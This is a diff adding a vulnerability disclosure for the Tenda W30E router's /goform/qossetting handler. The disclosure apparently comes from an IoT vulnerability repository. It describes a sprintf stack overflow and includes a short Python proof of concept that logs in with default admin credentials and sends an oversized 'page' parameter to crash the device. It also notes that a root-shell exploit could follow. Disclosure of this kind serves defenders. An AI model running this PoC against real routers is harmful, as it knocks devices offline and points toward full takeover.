@@ -13,3 +13,33 @@
 
 ## Vulnerability details
 
+![](https://github.com/z1r00/IOT_Vul/blob/main/Tenda/W30E/qossetting/img/2.png)
+
+In /goform/qossetting, the page will be spliced into s by sprintf. It is worth noting that there is no size check, which leads to a stack overflow vulnerability.
+
+## Poc
+
+```python
+import requests
+
+cmd = b'page=' + b'a' * 0x3000
+
+url = b"http://192.168.10.103/login/Auth"
+payload = b"http://192.168.10.103/goform/qossetting/?" + cmd
+
+data = {
+    "username": "admin",
+    "password": "admin",
+}
+
+def attack():
+    s = requests.session()
+    resp = s.post(url=url, data=data)
+    print(resp.content)
+    resp = s.post(url=payload, data=data)
+    print(resp.content)
+
+attack()
+```
+
+You can see that the router crashed, and finally you can write an exp to get a root shell
